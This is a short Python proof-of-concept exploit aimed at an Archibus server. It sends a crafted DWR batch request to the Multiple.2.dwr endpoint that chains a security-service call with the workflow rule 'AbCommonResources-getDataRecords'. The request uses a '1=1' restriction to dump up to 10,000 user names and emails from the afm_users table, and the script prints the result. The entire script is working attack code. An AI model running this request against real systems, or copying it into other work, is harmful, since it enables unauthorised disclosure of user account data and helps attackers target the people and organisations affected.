import sys
import urllib.request

base = sys.argv[1].rstrip("/")
body = r"""callCount=2
batchId=0
instanceId=0
page=%2F
scriptSessionId=abc/def
c0-scriptName=SecurityService
c0-methodName=isPasswordUppercase
c0-id=0
c0-param0=string:fixture-project
c1-scriptName=workflow
c1-methodName=runWorkflowRule
c1-id=1
c1-param0=string:AbCommonResources-getDataRecords
c1-param1=Object_Object:{tableName:reference:c1-e1,fieldNames:reference:c1-e2,indexField:reference:c1-e3,indexLevel:reference:c1-e4,indexValue:reference:c1-e5,sortValues:reference:c1-e6,filterValues:reference:c1-e7,restriction:reference:c1-e8,controlId:reference:c1-e9,recordLimit:reference:c1-e10}
c1-e1=string:afm_users
c1-e2=string:['afm_users.user_name', 'afm_users.email']
c1-e3=string:afm_users.user_name
c1-e4=string:0
c1-e5=string:
c1-e6=string:[]
c1-e7=string:[]
c1-e8=string:1=1
c1-e9=string:control-1
c1-e10=string:10000
c1-param2=null:null
"""
request = urllib.request.Request(
    base + "/archibus/dwr/call/plaincall/Multiple.2.dwr",
    data=body.encode(), headers={"Content-Type": "text/plain"}, method="POST"
)
print(urllib.request.urlopen(request).read().decode())
